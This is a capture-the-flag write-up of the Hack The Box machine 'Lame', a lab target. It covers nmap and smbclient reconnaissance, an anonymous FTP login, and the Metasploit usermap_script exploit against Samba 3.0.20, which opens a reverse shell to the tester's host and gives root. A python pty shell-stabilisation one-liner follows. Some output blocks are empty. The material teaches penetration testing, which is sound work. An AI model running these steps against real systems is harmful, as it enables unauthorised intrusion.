# Lame

Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement. 

The first thing to do with an IP address is to run an Nmap scan.
```
nmap -sC -Pn -A 10.10.10.3
```
```
Nmap scan report for 10.10.10.3

```
FTP, SSH, and Samba smdb are running on the machines.
I can connect to the FTP service using
```
ftp ftp://anonymous@10.10.10.3
```
Connecting with 'anonymous' doesn't require a password.
```

```
But I found nothing in there.
SSH will require a username and password or a public key to log in, but I don't have any.

Then comes the Samba service. 

Using `smbclient` to list the available shares on the target
```
â”€$ smbclient -L 10.10.10.3

```
I was able to connect to the tmp share, but nothing there.
Going through the Nmap scan, I see the Samba version (Samba 3.0.20-Debian).
I will use Metasploit to check if any exploit is available for this version

```
msf6 > search Samba 3.0.20

```
Using `exploit/multi/samba/usermap_script` to exploit the service running.
Setting the LHOST and RHOST with my machine IP and target IP, respectively, and running the exploit.

```
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.16.41:4444

whoami
root
which python
/usr/bin/python
```
But the shell is not stabilised. I will stabilise the shell with 
`python -c 'import pty;pty.spawn("/bin/bash")'`

`root@lame:/#`

Shell stabilisation is explained nicely here: https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal

Now that I have the shell access, I can find the flags using the `find` command.
